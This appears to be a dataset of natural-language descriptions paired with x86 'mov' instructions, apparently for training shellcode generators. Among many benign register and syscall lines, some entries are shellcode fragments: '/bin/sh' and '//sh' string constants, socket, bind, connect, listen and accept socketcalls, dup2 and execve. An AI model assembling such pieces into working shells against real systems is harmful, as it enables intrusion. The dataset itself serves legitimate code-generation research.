move 0x2e323931 into eax,move var0 var1,"mov eax , 0x2e323931","mov var1 , var0"
move 0x2e383631 into eax,move var0 var1,"mov eax , 0x2e383631","mov var1 , var0"
move 0x2f3e20 into eax,move var0 var1,"mov eax , 0x2f3e20","mov var1 , var0"
move 0x2f766564 into eax,move var0 var1,"mov eax , 0x2f766564","mov var1 , var0"
move 0x31263e32 into eax,move var0 var1,"mov eax , 0x31263e32","mov var1 , var0"
move 0x33392e31 into eax,move var0 var1,"mov eax , 0x33392e31","mov var1 , var0"
move 0x3f into eax,move var0 var1,"mov eax , 0x3f","mov var1 , var0"
move 5 into eax,move 5 var0,"mov eax , 0x5","mov var0 , 0x5"
move 0x50905090 into eax,move var0 var1,"mov eax , 0x50905090","mov var1 , var0"
move 0x563ed8b7 into eax,move var0 var1,"mov eax , 0x563ed8b7","mov var1 , var0"
move 0x66 into eax,move var0 var1,"mov eax , 0x66","mov var1 , var0"
move 0x6c6c756e into eax,move var0 var1,"mov eax , 0x6c6c756e","mov var1 , var0"
move 0x782f2f into eax,move var0 var1,"mov eax , 0x782f2f","mov var1 , var0"
move the 32-bit value 0x8000 into register eax,move var0 value var1 register var3,"mov eax , 0x8000","mov var3 , var1"
move 0x8b90909d into eax,move var0 var1,"mov eax , 0x8b90909d","mov var1 , var0"
move 0x969d8cd0 into eax,move var0 var1,"mov eax , 0x969d8cd0","mov var1 , var0"
move 0x9a8dd091 into eax,move var0 var1,"mov eax , 0x9a8dd091","mov var1 , var0"
move 0xb33fb33f into eax,move var0 var1,"mov eax , 0xb33fb33f","mov var1 , var0"
move 0xdeadc0de into eax,move var0 var1,"mov eax , 0xdeadc0de","mov var1 , var0"
move 0xfeffff80 into eax,move var0 var1,"mov eax , 0xfeffff80","mov var1 , var0"
move 0xffffffff into eax,move var0 var1,"mov eax , 0xffffffff","mov var1 , var0"
code for exit syscall,code var0 exit syscall,"mov eax , 1","mov eax , 1"
exit,exit,"mov eax , 1","mov eax , 1"
invoke sys_exit,invoke var0,"mov eax , 1","mov eax , 1"
make the system call exit,make system call exit,"mov eax , 1","mov eax , 1"
make the system call for exit,make system call var0 exit,"mov eax , 1","mov eax , 1"
make the system call to terminate the process,make system call terminate process,"mov eax , 1","mov eax , 1"
move 1 into eax,move 1 var0,"mov eax , 1","mov var0 , 1"
move the value one into eax,move value one var0,"mov eax , 1","mov var0 , 1"
specify exit syscall,specify exit syscall,"mov eax , 1","mov eax , 1"
system call exit,system call exit,"mov eax , 1","mov eax , 1"
terminate the process,terminate process,"mov eax , 1","mov eax , 1"
invoke sys_unlink,invoke var0,"mov eax , 10","mov eax , 10"
move 10 into eax,move 10 var0,"mov eax , 10","mov var0 , 10"
move 10000h into eax register,move 10000h var0 register,"mov eax , 10000h","mov var0 , 10000h"
invoke sys_socketcall,invoke var0,"mov eax , 102","mov eax , 102"
get information about the file,get information about file,"mov eax , 106","mov eax , 106"
make the system call stat,make system call var0,"mov eax , 106","mov eax , 106"
make the system call to get information about the file,make system call get information about file,"mov eax , 106","mov eax , 106"
stat,var0,"mov eax , 106","mov eax , 106"
system call stat,system call var0,"mov eax , 106","mov eax , 106"
execve,execve,"mov eax , 11","mov eax , 11"
invoke sys_execve,invoke var0,"mov eax , 11","mov eax , 11"
load and run the program,load and run program,"mov eax , 11","mov eax , 11"
make the system call execve,make system call execve,"mov eax , 11","mov eax , 11"
make the system to load and run the program,make system load and run program,"mov eax , 11","mov eax , 11"
system call execve,system call execve,"mov eax , 11","mov eax , 11"
invoke sys_time,invoke var0,"mov eax , 13","mov eax , 13"
move 132 to eax 132,move 132 var0 132,"mov eax , 132","mov var0 , 132"
go to file offset,go file offset,"mov eax , 19","mov eax , 19"
invoke sys_lseek,invoke var0,"mov eax , 19","mov eax , 19"
lseek,var0,"mov eax , 19","mov eax , 19"
make the system call lseek,make system call var0,"mov eax , 19","mov eax , 19"
make the system call to go to the file offset,make system call go file offset,"mov eax , 19","mov eax , 19"
system call lseek,system call var0,"mov eax , 19","mov eax , 19"
create a new process,create new process,"mov eax , 2","mov eax , 2"
fork,fork,"mov eax , 2","mov eax , 2"
invoke sys_fork,invoke var0,"mov eax , 2","mov eax , 2"
make the system call fork,make system call fork,"mov eax , 2","mov eax , 2"
make the system call to create a new process,make system call create new process,"mov eax , 2","mov eax , 2"
move the value two into eax,move value two var0,"mov eax , 2","mov var0 , 2"
system call fork,system call fork,"mov eax , 2","mov eax , 2"
get the process ID,get process var0,"mov eax , 20","mov eax , 20"
getpid,var0,"mov eax , 20","mov eax , 20"
make the system call getpid,make system call var0,"mov eax , 20","mov eax , 20"
make the system call to get the process ID,make system call get process var0,"mov eax , 20","mov eax , 20"
system call getpid,system call var0,"mov eax , 20","mov eax , 20"
get 21 in the eax register,get 21 var0 register,"mov eax , 21","mov var0 , 21"
alarm,alarm,"mov eax , 27","mov eax , 27"
make the system call alarm,make system call alarm,"mov eax , 27","mov eax , 27"
make the system call to set set signal delivery alarm clock,make system call set set signal delivery alarm clock,"mov eax , 27","mov eax , 27"
set signal delivery alarm clock,set signal delivery alarm clock,"mov eax , 27","mov eax , 27"
system call alarm,system call alarm,"mov eax , 27","mov eax , 27"
make the system call pause,make system call pause,"mov eax , 29","mov eax , 29"
make the system call to suspend the process,make system call suspend process,"mov eax , 29","mov eax , 29"
pause,pause,"mov eax , 29","mov eax , 29"
suspend the process until the signal arrives,suspend process var0 signal arrives,"mov eax , 29","mov eax , 29"
system call pause,system call pause,"mov eax , 29","mov eax , 29"
invoke sys_read,invoke var0,"mov eax , 3","mov eax , 3"
make the system call read,make system call read,"mov eax , 3","mov eax , 3"
make the system call to read the file,make system call read file,"mov eax , 3","mov eax , 3"
move 3 to the eax register,move 3 var0 register,"mov eax , 3","mov var0 , 3"
read,read,"mov eax , 3","mov eax , 3"
read the file,read file,"mov eax , 3","mov eax , 3"
specify sys_read call,specify var0 call,"mov eax , 3","mov eax , 3"
system call read,system call read,"mov eax , 3","mov eax , 3"
kill,kill,"mov eax , 37","mov eax , 37"
make the system call kill,make system call kill,"mov eax , 37","mov eax , 37"
make the system call to send the signal to another process,make system call send signal another process,"mov eax , 37","mov eax , 37"
send signal to another process,send signal another process,"mov eax , 37","mov eax , 37"
system call kill,system call kill,"mov eax , 37","mov eax , 37"
invoke sys_write,invoke var0,"mov eax , 4","mov eax , 4"
make the system call for write,make system call var0 write,"mov eax , 4","mov eax , 4"
make the system call to write to the file,make system call write file,"mov eax , 4","mov eax , 4"
make the system call write,make system call write,"mov eax , 4","mov eax , 4"
move 4 into eax,move 4 var0,"mov eax , 4","mov var0 , 4"
move 4 to the eax register,move 4 var0 register,"mov eax , 4","mov var0 , 4"
specify sys_write call,specify var0 call,"mov eax , 4","mov eax , 4"
specify sys_write syscall,specify var0 syscall,"mov eax , 4","mov eax , 4"
system call write,system call write,"mov eax , 4","mov eax , 4"
write,write,"mov eax , 4","mov eax , 4"
write to the file,write file,"mov eax , 4","mov eax , 4"
install signal handel,install signal handel,"mov eax , 48","mov eax , 48"
make the system call signal,make system call signal,"mov eax , 48","mov eax , 48"
make the system call to install the signal handler,make system call install signal handler,"mov eax , 48","mov eax , 48"
signal,signal,"mov eax , 48","mov eax , 48"
system call signal,system call signal,"mov eax , 48","mov eax , 48"
invoke sys_open,invoke var0,"mov eax , 5","mov eax , 5"
make the system call open,make system call open,"mov eax , 5","mov eax , 5"
make the system call to open the file,make system call open file,"mov eax , 5","mov eax , 5"
open,open,"mov eax , 5","mov eax , 5"
open the file,open file,"mov eax , 5","mov eax , 5"
system call open,system call open,"mov eax , 5","mov eax , 5"
close,close,"mov eax , 6","mov eax , 6"
close the file,close file,"mov eax , 6","mov eax , 6"
invoke sys_close,invoke var0,"mov eax , 6","mov eax , 6"
make the system call close,make system call close,"mov eax , 6","mov eax , 6"
make the system call to close the file,make system call close file,"mov eax , 6","mov eax , 6"
system call close,system call close,"mov eax , 6","mov eax , 6"
copy file descriptor,copy file descriptor,"mov eax , 63","mov eax , 63"
dup2,var0,"mov eax , 63","mov eax , 63"
make the system call dup2,make system call var0,"mov eax , 63","mov eax , 63"
make the system call to copy the file descriptor,make system call copy file descriptor,"mov eax , 63","mov eax , 63"
system call dup2,system call var0,"mov eax , 63","mov eax , 63"
get the parent process ID,get parent process var0,"mov eax , 64","mov eax , 64"
getppid,var0,"mov eax , 64","mov eax , 64"
make the system call getppid,make system call var0,"mov eax , 64","mov eax , 64"
make the system call to get the parent process ID,make system call get parent process var0,"mov eax , 64","mov eax , 64"
system call getppid,system call var0,"mov eax , 64","mov eax , 64"
get process group,get process group,"mov eax , 65","mov eax , 65"
getpgrp,var0,"mov eax , 65","mov eax , 65"
make the system call getpgrp,make system call var0,"mov eax , 65","mov eax , 65"
make the system call to get the process group,make system call get process group,"mov eax , 65","mov eax , 65"
system call getpgrp,system call var0,"mov eax , 65","mov eax , 65"
install portable signal handler,install portable signal handler,"mov eax , 67","mov eax , 67"
make the system call sigaction,make system call var0,"mov eax , 67","mov eax , 67"
make the system call to install portable signal handler,make system call install portable signal handler,"mov eax , 67","mov eax , 67"
sigaction,var0,"mov eax , 67","mov eax , 67"
system call sigaction,system call var0,"mov eax , 67","mov eax , 67"
make the system call to wait for child for terminate,make system call wait var0 child var0 terminate,"mov eax , 7","mov eax , 7"
make the system call waitpid,make system call var0,"mov eax , 7","mov eax , 7"
system call waitpid,system call var0,"mov eax , 7","mov eax , 7"
wait for child to terminate,wait var0 child terminate,"mov eax , 7","mov eax , 7"
waitpid,var0,"mov eax , 7","mov eax , 7"
invoke sys_creat,invoke var0,"mov eax , 8","mov eax , 8"
make the system call mmap,make system call var0,"mov eax , 90","mov eax , 90"
make the system call to map the memory page to a file,make system call map memory page file,"mov eax , 90","mov eax , 90"
map the memory page to a file,map memory page file,"mov eax , 90","mov eax , 90"
mmap,var0,"mov eax , 90","mov eax , 90"
move decimal number 90 into eax,move decimal number 90 var0,"mov eax , 90","mov var0 , 90"
system call mmap,system call var0,"mov eax , 90","mov eax , 90"
move addr into eax,move var0 var1,"mov eax , addr","mov var1 , var0"
move the contents of memory address array+esi*4 into eax,move contents memory address var0 var1,"mov eax , array[esi*4]","mov var1 , array[esi*4]"
move b to eax,move b var0,"mov eax , b","mov var0 , b"
move buff to eax,move buff var0,"mov eax , buff","mov var0 , buff"
move the memory address of buffer variable into eax,move memory address buffer variable var0,"mov eax , buffer","mov var0 , buffer"
move the address of buzz string into eax,move address buzz string var0,"mov eax , buzz","mov var0 , buzz"
move c to eax,move c var0,"mov eax , c","mov var0 , c"
move childmsg into eax,move var0 var1,"mov eax , childmsg","mov var1 , var0"
copy the contents of ebx into eax register,copy contents var0 var1 register,"mov eax , ebx","mov var1 , var0"
copy what is in ebx into eax,copy var0 var1 var2,"mov eax , ebx","mov var2 , var1"
move ebx to eax,move var0 var1,"mov eax , ebx","mov var1 , var0"
move the address in ebx into eax,move address var0 var1,"mov eax , ebx","mov var1 , var0"
transfer ebx to eax,transfer var0 var1,"mov eax , ebx","mov var1 , var0"
move the value in ecx into eax,move value var0 var1,"mov eax , ecx","mov var1 , var0"
move the value of ecx into eax,move value var0 var1,"mov eax , ecx","mov var1 , var0"
move edx into eax,move var0 var1,"mov eax , edx","mov var1 , var0"
move the remainder into eax,move remainder var0,"mov eax , edx","mov var0 , edx"
move esi into eax,move var0 var1,"mov eax , esi","mov var1 , var0"
move stack pointer to eax,move stack pointer var0,"mov eax , esp","mov var0 , esp"
move the address of the current stack pointer into eax,move address current stack pointer var0,"mov eax , esp","mov var0 , esp"
move the memory address of filecontents variable into eax,move memory address var0 variable var1,"mov eax , filecontents","mov var1 , var0"
move the address of fizz string into eax,move address fizz string var0,"mov eax , fizz","mov var0 , fizz"
move key into eax,move key var0,"mov eax , key","mov var0 , key"
move m_src to eax,move var0 var1,"mov eax , m_src","mov var1 , var0"
move the address of msg string into eax,move address msg string var0,"mov eax , msg","mov var0 , msg"
move msg1 string into eax,move var0 string var1,"mov eax , msg1","mov var1 , var0"
move the address of msg1 into eax,move address var0 var1,"mov eax , msg1","mov var1 , var0"
move the address of msg2 into eax,move address var0 var1,"mov eax , msg2","mov var1 , var0"
move the address of msg3 into eax,move address var0 var1,"mov eax , msg3","mov var1 , var0"
move mxcsr to eax,move var0 var1,"mov eax , mxcsr","mov var1 , var0"
move n_src to eax,move var0 var1,"mov eax , n_src","mov var1 , var0"
move parentmsg into eax,move var0 var1,"mov eax , parentmsg","mov var1 , var0"
move address of response variable into eax,move address response variable var0,"mov eax , response","mov var0 , response"
move the number of bytes of var4 into eax,move number bytes var0 var1,"mov eax , type var4","mov var1 , type var0"
place address of buffer into ebp,place address buffer var0,"mov ebp , buff","mov var0 , buff"
move eax to ebp,move var0 var1,"mov ebp , eax","mov var1 , var0"
move ecx into ebp,move var0 var1,"mov ebp , ecx","mov var1 , var0"
point ebp to the esp register,point var0 esp register,"mov ebp , esp","mov var0 , esp"
point ebp to top of stack,point var0 top stack,"mov ebp , esp","mov var0 , esp"
set the new base pointer,set new base pointer,"mov ebp , esp","mov ebp , esp"
move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register,move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register,"mov ebx , [ebp-4]","mov ebx , [ebp-4]"
move the contents of the address [ebp-4] into the ebx register,move the contents of the address [ebp-4] into the ebx register,"mov ebx , [ebp-4]","mov ebx , [ebp-4]"
move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register,move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register,"mov ebx , [ebp-8]","mov ebx , [ebp-8]"
move the contents of the address [ebp-8] into the ebx register,move the contents of the address [ebp-8] into the ebx register,"mov ebx , [ebp-8]","mov ebx , [ebp-8]"
move value at top of the stack to ebx,move value top stack var0,"mov ebx , [esp]","mov var0 , [esp]"
move effective address of my_table in ebx,move effective address var0 var1,"mov ebx , [my_table]","mov var1 , [var0]"
save the effective address of my_table in ebx,save effective address var0 var1,"mov ebx , [my_table]","mov var1 , [var0]"
move the contents at memory address temp2 to ebx,move contents memory address var0 var1,"mov ebx , [temp2]","mov var1 , [var0]"
move the contents at memory address x to ebx,move contents memory address x var0,"mov ebx , [x]","mov var0 , [x]"
move the contents at memory address y to ebx,move contents memory address y var0,"mov ebx , [y]","mov var0 , [y]"
exit with return code of 0,exit return code 0,"mov ebx , 0","mov ebx , 0"
return 0 status on exit,return 0 status exit,"mov ebx , 0","mov ebx , 0"
return a code of zero,return code zero,"mov ebx , 0","mov ebx , 0"
specify file descriptor 0 as standard input,specify file descriptor 0 standard input,"mov ebx , 0","mov ebx , 0"
use stdin,use var0,"mov ebx , 0","mov ebx , 0"
write to the stdin file,write var0 file,"mov ebx , 0","mov ebx , 0"
move 0x1 into ebx,move var0 var1,"mov ebx , 0x1","mov var1 , var0"
move 0x4 into ebx,move var0 var1,"mov ebx , 0x4","mov var1 , var0"
move the 32-bit value 0x40000 into register ebx,move var0 value var1 register var3,"mov ebx , 0x40000","mov var3 , var1"
move 0x5 into ebx,move var0 var1,"mov ebx , 0x5","mov var1 , var0"
move the value 0xfee1dead into the ebx register,move value var0 var1 register,"mov ebx , 0xfee1dead","mov var1 , var0"
file descriptor 1 standard output,file descriptor 1 standard output,"mov ebx , 1","mov ebx , 1"
invoke subroutine socket,invoke subroutine socket,"mov ebx , 1","mov ebx , 1"
move 1 into ebx,move 1 var0,"mov ebx , 1","mov var0 , 1"
specify file descriptor 1 standard output,specify file descriptor 1 standard output,"mov ebx , 1","mov ebx , 1"
use stdout,use var0,"mov ebx , 1","mov ebx , 1"
write to the stdout file,write var0 file,"mov ebx , 1","mov ebx , 1"
move decimal value 10 into ebx,move decimal value 10 var0,"mov ebx , 10","mov var0 , 10"
invoke subroutine bind,invoke subroutine bind,"mov ebx , 2","mov ebx , 2"
specify file descriptor 2 standard error,specify file descriptor 2 standard error,"mov ebx , 2","mov ebx , 2"
invoke subroutine connect,invoke subroutine connect,"mov ebx , 3","mov ebx , 3"
move 3 to the ebx register,move 3 var0 register,"mov ebx , 3","mov var0 , 3"
move decimal number 3 into ebx,move decimal number 3 var0,"mov ebx , 3","mov var0 , 3"
invoke subroutine listen,invoke subroutine listen,"mov ebx , 4","mov ebx , 4"
invoke subroutine accept,invoke subroutine accept,"mov ebx , 5","mov ebx , 5"
move 5 into ebx,move 5 var0,"mov ebx , 5","mov var0 , 5"
move number 9 into ebx,move number 9 var0,"mov ebx , 9","mov var0 , 9"
move buff to ebx,move buff var0,"mov ebx , buff","mov var0 , buff"
move command into ebx,move command var0,"mov ebx , command","mov var0 , command"
move dword 0x5090508f into ebx,move dword var0 var1,"mov ebx , dword 0x5090508f","mov var1 , dword var0"
move dword 0x50905091 into ebx,move dword var0 var1,"mov ebx , dword 0x50905091","mov var1 , dword var0"
move the address in eax into ebx,move address var0 var1,"mov ebx , eax","mov var1 , var0"
move the contents of the eax register into the ebx register,move contents var0 register var1 register,"mov ebx , eax","mov var1 , var0"
move eax into ebx,move var0 var1,"mov ebx , eax","mov var1 , var0"
move ecx into ebx,move var0 var1,"mov ebx , ecx","mov var1 , var0"
backup ecx into ebx,backup var0 var1,"mov ebx , ecx","mov var1 , var0"
move edi into ebx,move var0 var1,"mov ebx , edi","mov var1 , var0"
move edx into ebx,move var0 var1,"mov ebx , edx","mov var1 , var0"
move esi into ebx,move var0 var1,"mov ebx , esi","mov var1 , var0"
move the address of the character on the stack into ebx,move address character stack var0,"mov ebx , esp","mov var0 , esp"
move the contents of the esp register into the ebx register,move contents esp register var0 register,"mov ebx , esp","mov var0 , esp"
point ebx to stack,point var0 stack,"mov ebx , esp","mov var0 , esp"
push /bin/sh into ebx,var0 var1,"mov ebx , esp","mov var1 , esp"
move esp into ebx,move esp var0,"mov ebx , esp","mov var0 , esp"
move address of stack pointer into ebx,move address stack pointer var0,"mov ebx , esp","mov var0 , esp"
move filename into ebx,move filename var0,"mov ebx , filename","mov var0 , filename"
move m_src1 to ebx,move var0 var1,"mov ebx , m_src1","mov var1 , var0"
move m_src2 to ebx,move var0 var1,"mov ebx , m_src2","mov var1 , var0"
move the address of msg string into ebx,move address msg string var0,"mov ebx , msg","mov var0 , msg"
move n to ebx,move n var0,"mov ebx , n","mov var0 , n"
move name into ebx,move name var0,"mov ebx , name","mov var0 , name"
move address of request variable into ebx,move address request variable var0,"mov ebx , request","mov var0 , request"
move sock_reg into ebx,move var0 var1,"mov ebx , sock_reg","mov var1 , var0"
move the number of bytes of var3 into ebx,move number bytes var0 var1,"mov ebx , type var3","mov var1 , type var0"
move the value of upcase into ebx,move value var0 var1,"mov ebx , upcase","mov var1 , var0"
move the contents of x into ebx,move contents x var0,"mov ebx , x","mov var0 , x"
move zero_reg into ebx,move var0 var1,"mov ebx , zero_reg","mov var1 , var0"
move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register,move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register,"mov ecx , [ebp+12]","mov ecx , [ebp+12]"
move the contents of the address [ebp+12] into ecx,move the contents of the address [ebp+12] into ecx,"mov ecx , [ebp+12]","mov ecx , [ebp+12]"
move the 4 bytes of data at address esi+4*eax into ecx,move 4 bytes data address var0 var1,"mov ecx , [esi+4*eax]","mov var1 , [var0]"
move the contents of esp into ecx,move contents esp var0,"mov ecx , [esp]","mov var0 , [esp]"
move the contents of the esp register into the ecx register,move contents esp register var0 register,"mov ecx , [esp]","mov var0 , [esp]"
move effective address of my_table in ecx,move effective address var0 var1,"mov ecx , [my_table]","mov var1 , [var0]"
move the contents at memory address temp3 to ecx,move contents memory address var0 var1,"mov ecx , [temp3]","mov var1 , [var0]"
move the contents at memory address x to ecx,move contents memory address x var0,"mov ecx , [x]","mov var0 , [x]"
move permissions to read write and execute into ecx,move permissions read write and execute var0,"mov ecx , 0777","mov var0 , 0777"
move 0x0 into ecx,move var0 var1,"mov ecx , 0x0","mov var1 , var0"
move 0x1 into ecx,move var0 var1,"mov ecx , 0x1","mov var1 , var0"
move 0x88998899 into ecx,move var0 var1,"mov ecx , 0x88998899","mov var1 , var0"
move 1 into ecx,move 1 var0,"mov ecx , 1","mov var0 , 1"
get 36 in the ecx,get 36 var0,"mov ecx , 36","mov var0 , 36"
move 4294948047 into ecx,move 4294948047 var0,"mov ecx , 4294948047","mov var0 , 4294948047"
move the value 672274793 into the ecx register,move value 672274793 var0 register,"mov ecx , 672274793","mov var0 , 672274793"
move the address of the arguments into ecx,move address arguments var0,"mov ecx , arguments","mov var0 , arguments"
move the first element of array into ecx,move first element array var0,"mov ecx , array","mov var0 , array"
move the first element in array2 into ecx,move first element var0 var1,"mov ecx , array2","mov var1 , var0"
move b to ecx,move b var0,"mov ecx , b","mov var0 , b"
move buff to ecx,move buff var0,"mov ecx , buff","mov var0 , buff"
move the memory address of buffer variable into ecx,move memory address buffer variable var0,"mov ecx , buffer","mov var0 , buffer"
move the memory address of contents string into ecx,move memory address contents string var0,"mov ecx , contents","mov var0 , contents"
move the memory address of contents variable into ecx,move memory address contents variable var0,"mov ecx , contents","mov var0 , contents"
move donemsg into ecx,move var0 var1,"mov ecx , donemsg","mov var1 , var0"
move eatmsg into ecx,move var0 var1,"mov ecx , eatmsg","mov var1 , var0"
move eax into ecx,move var0 var1,"mov ecx , eax","mov var1 , var0"
move edi into ecx,move var0 var1,"mov ecx , edi","mov var1 , var0"
move edx into ecx,move var0 var1,"mov ecx , edx","mov var1 , var0"
move the contents of the edx register into the ecx register,move contents var0 register var1 register,"mov ecx , edx","mov var1 , var0"
backup edx into ecx,backup var0 var1,"mov ecx , edx","mov var1 , var0"
move esi into ecx,move var0 var1,"mov ecx , esi","mov var1 , var0"
ecx point to the top of the stack,var0 point top stack,"mov ecx , esp","mov var0 , esp"
move the address of the stack pointer into ecx,move address stack pointer var0,"mov ecx , esp","mov var0 , esp"
move the contents of esp into ecx,move contents esp var0,"mov ecx , esp","mov var0 , esp"
move address of arguments into ecx,move address arguments var0,"mov ecx , esp","mov var0 , esp"
save the memory location of arg[0] into the ecx register,save memory location arg [var1] var2 register,"mov ecx , esp","mov var2 , esp"
move address of stack pointer into ecx,move address stack pointer var0,"mov ecx , esp","mov var0 , esp"
point ecx to the top of the stack,point var0 top stack,"mov ecx , esp","mov var0 , esp"
move the memory address of our file contents variable into ecx,move memory address our file contents variable var0,"mov ecx , filecontents","mov var0 , filecontents"
put the offset of hello in ecx,put offset hello var0,"mov ecx , hello","mov var0 , hello"
move hexstr into ecx,move var0 var1,"mov ecx , hexstr","mov var1 , var0"
move m_src3 to ecx,move var0 var1,"mov ecx , m_src3","mov var1 , var0"
move msg to ecx,move msg var0,"mov ecx , msg","mov var0 , msg"
move the address of message string into ecx,move address message string var0,"mov ecx , msg","mov var0 , msg"
move the memory address of message string into ecx,move memory address message string var0,"mov ecx , msg","mov var0 , msg"
move starting address of array to ecx,move starting address array var0,"mov ecx , offset array","mov var0 , offset array"
move readbuffer into ecx,move var0 var1,"mov ecx , readbuffer","mov var1 , var0"
move address of request variable into ecx,move address request variable var0,"mov ecx , request","mov var0 , request"
move address of response variable into ecx,move address response variable var0,"mov ecx , response","mov var0 , response"
move rm to ecx,move var0 var1,"mov ecx , rm","mov var1 , var0"
move rn to ecx,move rn var0,"mov ecx , rn","mov var0 , rn"
move the number of bytes of var2 into ecx,move number bytes var0 var1,"mov ecx , type var2","mov var1 , type var0"
move the contents of y into ecx,move contents y var0,"mov ecx , y","mov var0 , y"
move value the contents of memory address ebp+16 into edi,move value contents memory address var0 var1,"mov edi , [ebp+16]","mov var1 , [var0]"
move 0x343997b7 into edi,move var0 var1,"mov edi , 0x343997b7","mov var1 , var0"
move 0x978cd092 into edi,move var0 var1,"mov edi , 0x978cd092","mov var1 , var0"
move 0xada67373 into edi,move var0 var1,"mov edi , 0xada67373","mov var1 , var0"
move 876189623 into edi,move 876189623 var0,"mov edi , 876189623","mov var0 , 876189623"
move 884021143 into edi,move 884021143 var0,"mov edi , 884021143","mov var0 , 884021143"
move eax into edi,move var0 var1,"mov edi , eax","mov var1 , var0"
move the return value of sys_socketcall into edi,move return value var0 var1,"mov edi , eax","mov var1 , eax"
move ecx into edi,move var0 var1,"mov edi , ecx","mov var1 , var0"
move edx into edi,move var0 var1,"mov edi , edx","mov var1 , var0"
move the remainder into edi,move remainder var0,"mov edi , edx","mov var0 , edx"
move esp into edi,move esp var0,"mov edi , esp","mov var0 , esp"
place hexstr into edi,place var0 var1,"mov edi , hexstr","mov var1 , var0"
move the 4 bytes of data at address esi+4*ebx into edx,move 4 bytes data address var0 var1,"mov edx , [esi+4*ebx]","mov var1 , [var0]"
move the contents of the esp register into the edx register,move contents esp register var0 register,"mov edx , [esp]","mov var0 , [esp]"
move the contents at memory address temp4 to edx,move contents memory address var0 var1,"mov edx , [temp4]","mov var1 , [var0]"
move the contents at memory address z to edx,move contents memory address z var0,"mov edx , [z]","mov var0 , [z]"
move the value 0x1234567 into the edx register,move value var0 var1 register,"mov edx , 0x1234567","mov var1 , var0"
move 1 into edx,move 1 var0,"mov edx , 1","mov var0 , 1"
move integer 11 to edx,move integer 11 var0,"mov edx , 11","mov var0 , 11"
move 12 to edx,move 12 var0,"mov edx , 12","mov var0 , 12"
move 13 into edx,move 13 var0,"mov edx , 13","mov var0 , 13"
move decimal 2 into edx,move decimal 2 var0,"mov edx , 2","mov var0 , 2"
move decimal number 255 into edx,move decimal number 255 var0,"mov edx , 255","mov var0 , 255"
move 3 decimal into edx,move 3 decimal var0,"mov edx , 3","mov var0 , 3"
move 43 decimal into edx,move 43 decimal var0,"mov edx , 43","mov var0 , 43"
move decimal 43 into edx,move decimal 43 var0,"mov edx , 43","mov var0 , 43"
move 66729180 into edx,move 66729180 var0,"mov edx , 66729180","mov var0 , 66729180"
store 78 decimal into edx,store 78 decimal var0,"mov edx , 78","mov var0 , 78"
move 8 decimal into edx,move 8 decimal var0,"mov edx , 8","mov var0 , 8"
put 8 into edx,put 8 var0,"mov edx , 8","mov var0 , 8"
move number 9 into edx,move number 9 var0,"mov edx , 9","mov var0 , 9"
move buff to edx,move buff var0,"mov edx , buff","mov var0 , buff"
move bufflen into edx,move var0 var1,"mov edx , bufflen","mov var1 , var0"
move donelen into edx,move var0 var1,"mov edx , donelen","mov var1 , var0"
move dword 0x65676760 into edx,move dword var0 var1,"mov edx , dword 0x65676760","mov var1 , dword var0"
move the doubleword 0x65676760 into edx,move doubleword var0 var1,"mov edx , dword 0x65676760","mov var1 , dword var0"
move eatlen into edx,move var0 var1,"mov edx , eatlen","mov var1 , var0"
move eax into edx,move var0 var1,"mov edx , eax","mov var1 , var0"
backup eax into edx,backup var0 var1,"mov edx , eax","mov var1 , var0"
move ebp into edx,move var0 var1,"mov edx , ebp","mov var1 , var0"
move ecx into edx,move var0 var1,"mov edx , ecx","mov var1 , var0"
move ecx to edx,move var0 var1,"mov edx , ecx","mov var1 , var0"
move the address of environment variable into edx,move address environment variable var0,"mov edx , environment","mov var0 , environment"
move esi into edx,move var0 var1,"mov edx , esi","mov var1 , var0"
move esp into edx,move esp var0,"mov edx , esp","mov var0 , esp"
move the contents of the esp register into the edx register,move contents esp register var0 register,"mov edx , esp","mov var0 , esp"
move the stack pointer into edx,move stack pointer var0,"mov edx , esp","mov var0 , esp"
move filename into edx,move filename var0,"mov edx , filename","mov var0 , filename"
move hellolen into edx,move var0 var1,"mov edx , hellolen","mov var1 , var0"
move variable len to edx,move variable var0 var1,"mov edx , len","mov var1 , var0"
move m_src4 to edx,move var0 var1,"mov edx , m_src4","mov var1 , var0"
move n to edx,move n var0,"mov edx , n","mov var0 , n"
move readbuffer into edx,move var0 var1,"mov edx , readbuffer","mov var1 , var0"
move readlen into edx,move var0 var1,"mov edx , readlen","mov var1 , var0"
move address of response variable into edx,move address response variable var0,"mov edx , response","mov var0 , response"
move the contents of src variable into edx,move contents var0 variable var1,"mov edx , src","mov var1 , var0"
move the contents of tmp variable into edx,move contents var0 variable var1,"mov edx , tmp","mov var1 , var0"
move the number of bytes of var1 into edx,move number bytes var0 var1,"mov edx , type var1","mov var1 , type var0"
move the contents of memory address ebp+12 into esi,move contents memory address var0 var1,"mov esi , [ebp+12]","mov var1 , [var0]"
move 0x222933f0 into esi,move var0 var1,"mov esi , 0x222933f0","mov var1 , var0"
move 0x243525f0 into esi,move var0 var1,"mov esi , 0x243525f0","mov var1 , var0"
move 0x34399797 into esi,move var0 var1,"mov esi , 0x34399797","mov var1 , var0"
move 0x353ffc3b into esi,move var0 var1,"mov esi , 0x353ffc3b","mov var1 , var0"
move 0x563a1f3e into esi,move var0 var1,"mov esi , 0x563a1f3e","mov var1 , var0"
move 0x65636170 into esi,move var0 var1,"mov esi , 0x65636170","mov var1 , var0"
move 0x68732f2f into esi,move var0 var1,"mov esi , 0x68732f2f","mov var1 , var0"
move 0x72702f2f into esi,move var0 var1,"mov esi , 0x72702f2f","mov var1 , var0"
move 0x735f6176 into esi,move var0 var1,"mov esi , 0x735f6176","mov var1 , var0"
move 0x91969dd0 into esi,move var0 var1,"mov esi , 0x91969dd0","mov var1 , var0"
move 0xd2c45e5e into esi,move var0 var1,"mov esi , 0xd2c45e5e","mov var1 , var0"
move 10 into esi,move 10 var0,"mov esi , 10","mov var0 , 10"
move 9 into esi,move 9 var0,"mov esi , 9","mov var0 , 9"
place address buff into esi,place address buff var0,"mov esi , buff","mov var0 , buff"
move pointer in eax into esi,move pointer var0 var1,"mov esi , eax","mov var1 , var0"
move eax into esi,move var0 var1,"mov esi , eax","mov var1 , var0"
move ecx into esi,move var0 var1,"mov esi , ecx","mov var1 , var0"
move remainder into esi,move remainder var0,"mov esi , edx","mov var0 , edx"
move esp into esi,move esp var0,"mov esi , esp","mov var0 , esp"
move v to esi,move v var0,"mov esi , v","mov var0 , v"
